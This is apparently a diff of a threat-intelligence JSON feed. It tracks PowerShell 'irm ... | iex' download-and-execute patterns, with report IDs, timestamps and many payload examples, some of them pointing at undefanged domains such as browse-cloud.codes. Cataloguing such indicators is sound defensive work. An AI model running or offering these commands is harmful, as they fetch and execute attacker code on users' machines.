@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 167,
-    "ReportCount": 167,
-    "FirstSeen": "2026-11-12T09:49:03.263000+00:00",
+    "DistinctPayloadCount": 166,
+    "ReportCount": 166,
+    "FirstSeen": "2026-11-12T11:30:20.446000+00:00",
     "LastSeen": "2026-11-19T09:24:22.692000+00:00",
     "ReportIds": [
-      "cmwdd8ni903ki0oml708xi8pf",
       "cmwdguwhj03zw0omlnorqrh3r",
       "cmwdhc1qp041s0oml2r6bl190",
       "cmwdsgbm604qt0oml3owfisgv",
@@ -313,7 +312,6 @@
       "irm 'browse-cloud.codes/deb16e74de52341f'|iex;",
       "irm 'browse-cloud.codes/df566b6947c2c0cc'|iex;",
       "irm 'browse-cloud.codes/df805a6fac02c376'|iex;",
-      "irm 'browse-cloud.codes/e058fa21b0d6398a'|iex;",
       "irm 'browse-cloud.codes/e0d5e1e484132468'|iex;",
       "irm 'browse-cloud.codes/e0f86137ef78e8ec'|iex;",
       "irm 'browse-cloud.codes/e1869d542b246dfd'|iex;",
@@ -346,10 +344,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 89,
-    "ReportCount": 89,
+    "DistinctPayloadCount": 91,
+    "ReportCount": 91,
     "FirstSeen": "2026-11-12T10:50:52.751000+00:00",
-    "LastSeen": "2026-11-19T06:02:27.071000+00:00",
+    "LastSeen": "2026-11-19T09:49:42.393000+00:00",
     "ReportIds": [
       "cmwdfg5is03uq0oml2mt1nbdk",
       "cmwdutkf6051q0omli4b2mlk3",
@@ -439,7 +437,9 @@
       "cmwn2xjeb1v840omlxm38u0i7",
       "cmwn2xlv71v8e0oml2qwwvtkp",
       "cmwn2xv5d1vah0omlj4s83o4q",
-      "cmwn587041vmx0omlbdxa6kbs"
+      "cmwn587041vmx0omlbdxa6kbs",
+      "cmwndbx891w080oml29yh3d48",
+      "cmwndcg261w1d0oml4mnk1sjd"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -493,6 +493,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/496d1f744b38ba90')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/49c93b81b4b455a5')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/51465b6b04dc16ac')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/528af28445997174')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/5442447929e9128c')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/54f78c6e5e159821')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/55bbcc0972a7f52e')|iex",
@@ -524,6 +525,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d949f4f108fe9c12')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/dc5144f8511e6786')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/e6c7fe41a04fdf28')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7b8d2ecd60505d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ec0b04f84abaee4a')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f8dec8b4b16293e1')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/08e224a04deaeb52')|iex",
